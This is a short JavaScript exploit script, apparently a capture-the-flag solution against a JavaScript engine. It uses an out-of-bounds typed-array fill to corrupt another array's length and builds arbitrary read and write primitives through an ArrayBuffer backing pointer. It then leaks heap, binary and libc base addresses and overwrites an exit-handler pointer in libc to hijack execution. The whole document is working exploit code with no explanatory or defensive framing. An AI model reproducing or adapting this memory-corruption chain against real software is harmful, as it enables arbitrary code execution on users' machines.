let a = new Uint32Array([0,1,2]);
let b = new Uint32Array([1,2,3,4,5]);

ab = new ArrayBuffer(0x2000);

a.fill(0xffff, 55, 56); // b length

PTR_BASE = b[16] * 0x100000000;

ptr = PTR_BASE + b[5] - 1;

heap = b[28] * 0x100000000 + b[27];

console.log("heap : 0x" + heap.toString(16));
console.log("ptr : 0x" + ptr.toString(16));

function read(addr){
    b[27] = addr & 0xffffffff;
    b[28] = parseInt(BigInt(addr) >> BigInt(32));
    let tmp = new Uint32Array(ab);
    return [tmp[1] , tmp[0]];
}

function read64(addr){
    let tmp = read(addr);
    return tmp[0] * 0x100000000 + tmp[1];
}

function read32(addr) { 
    return read(addr)[1];
}

function write64(addr, value) {
    b[27] = addr & 0xffffffff;
    b[28] = parseInt(BigInt(addr) >> BigInt(32));
    let tmp = new Uint32Array(ab);
    tmp[0] = value & 0xffffffff;
    tmp[1] = parseInt(BigInt(value) >> BigInt(32));
}

properties1 = PTR_BASE + read32(ptr+0x38) - 1;

console.log("properties1 : 0x" + properties1.toString(16));

properties2 = PTR_BASE + read32(properties1+12) - 1;

console.log("properties2 : 0x" + properties2.toString(16));

code = PTR_BASE + read32(properties2+0x18) - 1;

console.log("code : 0x" + code.toString(16));

pie = parseInt(BigInt(read64(code+0x40)) >> BigInt(16)) - 0x11a3700;

console.log("pie : 0x" + pie.toString(16));

libc = read64(pie+0x1468d40) - 0x083cc0; // from puts&pie

console.log("libc : 0x" + libc.toString(16));

write64(libc+0x1e66c8,libc+0xe2383); //  0x7ffff7c7f398 <__run_exit_handlers+552>    call   qword ptr [rbx] <0x7ffff7cc9f50>_IO_cleanup__
